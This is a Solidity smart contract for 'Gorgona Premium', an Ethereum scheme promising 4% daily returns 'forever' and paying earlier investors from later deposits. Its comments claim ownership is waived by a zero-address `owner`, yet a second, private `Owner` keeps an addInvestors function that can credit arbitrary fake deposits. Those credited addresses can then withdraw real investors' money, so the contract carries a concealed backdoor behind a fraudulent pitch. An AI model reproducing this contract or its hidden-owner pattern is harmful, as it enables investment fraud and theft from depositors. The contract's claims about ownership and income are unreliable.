1 pragma solidity ^0.4.24;
2 
3 /**
4 *
5 *    Gorgona Premium
6 *
7 *    Our Telegram Channel - https://t.me/gorgona4premium
8 *    Support              - https://t.me/gorgona_premium
9 * 
10 *  - Earn 4.0% daily and forever
11 *  - Reliable income based on the open source smart contract.
12 *  - Minimal contribution 0.01 eth
13 *  - Investor can request his dividends by himself sending 0 ETH to the address of the smart-contract.
14 *  - Distribution of funds:
15 * 
16 *    PAYOUTS TO INVESTORS - 100% VS 80% IN GORGONA BASIC
17 *    NO COMMISSION TO ADMINS
18 *
19 *  
20 *    RECOMMENDED GAS LIMIT: 200 000
21 *    RECOMMENDED GAS PRICE: https://ethgasstation.info/
22 *    You can check the payments on the etherscan.io site, in the "Internal Txns" tab of your wallet.
23 *
24 **/
25 
26 contract GorgonaPremium {
27     address Owner; // create the owner to process some contract settings
28     address public owner = 0x0000000000000000000000000000000000000000; // immediate ownership waiver after contract execution
29     address public adminAddr;
30     uint constant public MASS_TRANSACTION_LIMIT = 150;
31     uint constant public MINIMUM_INVEST = 10000000000000000 wei;
32     uint constant public INTEREST = 4; // 4% IN GORGONA PREMIUM VS 3% IN GORGONA BASIC
33     uint public depositAmount;
34     uint public round;
35     uint public lastPaymentDate;
36     GorgonaKiller public gorgonaKiller;
37     address[] public addresses;
38     mapping(address => Investor) public investors;
39     bool public pause;
40 
41     struct Investor
42     {
43         uint id;
44         uint deposit;
45         uint deposits;
46         uint date;
47         address referrer;
48     }
49 
50     struct GorgonaKiller
51     {
52         address addr;
53         uint deposit;
54     }
55 
56     event Invest(address addr, uint amount, address referrer);
57     event Payout(address addr, uint amount, string eventType, address from);
58     event NextRoundStarted(uint round, uint date, uint deposit);
59     event GorgonaKillerChanged(address addr, uint deposit);
60 
61     modifier onlyOwner {if (msg.sender == Owner) _;}
62 
63     constructor() public {
64         Owner = msg.sender;
65         adminAddr = msg.sender;
66         addresses.length = 1;
67         round = 1;
68     }
69 
70     function transferOwnership(address addr) onlyOwner public {
71         Owner = addr;
72     }
73 
74     function addInvestors(address[] _addr, uint[] _deposit, uint[] _date, address[] _referrer) onlyOwner public {
75         // add initiated investors
76         for (uint i = 0; i < _addr.length; i++) {
77             uint id = addresses.length;
78             if (investors[_addr[i]].deposit == 0) {
79                 addresses.push(_addr[i]);
80                 depositAmount += _deposit[i];
81             }
82 
83             investors[_addr[i]] = Investor(id, _deposit[i], 1, _date[i], _referrer[i]);
84             emit Invest(_addr[i], _deposit  [i], _referrer[i]);
85 
86             if (investors[_addr[i]].deposit > gorgonaKiller.deposit) {
87                 gorgonaKiller = GorgonaKiller(_addr[i], investors[_addr[i]].deposit);
88             }
89         }
90         lastPaymentDate = now;
91     }
92 
93     function() payable public {
94         if (owner == msg.sender) {
95             return;
96         }
97 
98         if (0 == msg.value) {
99             payoutSelf();
100             return;
101         }
102 
103         require(false == pause, "Gorgona is restarting. Please wait.");
104         require(msg.value >= MINIMUM_INVEST, "Too small amount, minimum 0.01 ether");
105         Investor storage user = investors[msg.sender];
106 
107         if (user.id == 0) {
108             // ensure that payment not from hacker contract
109             msg.sender.transfer(0 wei);
110             addresses.push(msg.sender);
111             user.id = addresses.length;
112             user.date = now;
113 
114             // referrer
115             address referrer = bytesToAddress(msg.data);
116             if (investors[referrer].deposit > 0 && referrer != msg.sender) {
117                 user.referrer = referrer;
118             }
119         } else {
120             payoutSelf();
121         }
122 
123         // save investor
124         user.deposit += msg.value;
125         user.deposits += 1;
126 
127         emit Invest(msg.sender, msg.value, user.referrer);
128 
129         depositAmount += msg.value;
130         lastPaymentDate = now;
131 
132         // adminAddr.transfer(msg.value / 5); 100% GO TO BANK IN GORGONA PREMIUM
133         uint bonusAmount = (msg.value / 100) * INTEREST; // referrer commission for all deposits
134 
135         if (user.referrer > 0x0) {
136             if (user.referrer.send(bonusAmount)) {
137                 emit Payout(user.referrer, bonusAmount, "referral", msg.sender);
138             }
139 
140             if (user.deposits == 1) { // cashback only for the first deposit
141                 if (msg.sender.send(bonusAmount)) {
142                     emit Payout(msg.sender, bonusAmount, "cash-back", 0);
143                 }
144             }
145         } else if (gorgonaKiller.addr > 0x0) {
146             if (gorgonaKiller.addr.send(bonusAmount)) {
147                 emit Payout(gorgonaKiller.addr, bonusAmount, "killer", msg.sender);
148             }
149         }
150 
151         if (user.deposit > gorgonaKiller.deposit) {
152             gorgonaKiller = GorgonaKiller(msg.sender, user.deposit);
153             emit GorgonaKillerChanged(msg.sender, user.deposit);
154         }
155     }
156 
157     function payout(uint offset) public
158     {
159         if (pause == true) {
160             doRestart();
161             return;
162         }
163 
164         uint txs;
165         uint amount;
166 
167         for (uint idx = addresses.length - offset - 1; idx >= 1 && txs < MASS_TRANSACTION_LIMIT; idx--) {
168             address addr = addresses[idx];
169             if (investors[addr].date + 20 hours > now) {
170                 continue;
171             }
172 
173             amount = getInvestorDividendsAmount(addr);
174             investors[addr].date = now;
175 
176             if (address(this).balance < amount) {
177                 pause = true;
178                 return;
179             }
180 
181             if (addr.send(amount)) {
182                 emit Payout(addr, amount, "bulk-payout", 0);
183             }
184 
185             txs++;
186         }
187     }
188 
189     function payoutSelf() private {
190         require(investors[msg.sender].id > 0, "Investor not found.");
191         uint amount = getInvestorDividendsAmount(msg.sender);
192 
193         investors[msg.sender].date = now;
194         if (address(this).balance < amount) {
195             pause = true;
196             return;
197         }
198 
199         msg.sender.transfer(amount);
200         emit Payout(msg.sender, amount, "self-payout", 0);
201     }
202 
203     function doRestart() private {
204         uint txs;
205         address addr;
206 
207         for (uint i = addresses.length - 1; i > 0; i--) {
208             addr = addresses[i];
209             addresses.length -= 1;
210             delete investors[addr];
211             if (txs++ == MASS_TRANSACTION_LIMIT) {
212                 return;
213             }
214         }
215 
216         emit NextRoundStarted(round, now, depositAmount);
217         pause = false;
218         round += 1;
219         depositAmount = 0;
220         lastPaymentDate = now;
221 
222         delete gorgonaKiller;
223     }
224 
225     function getInvestorCount() public view returns (uint) {
226         return addresses.length - 1;
227     }
228 
229     function getInvestorDividendsAmount(address addr) public view returns (uint) {
230         return investors[addr].deposit / 100 * INTEREST * (now - investors[addr].date) / 1 days;
231     }
232 
233     function bytesToAddress(bytes bys) private pure returns (address addr) {
234         assembly {
235             addr := mload(add(bys, 20))
236         }
237     }
238 }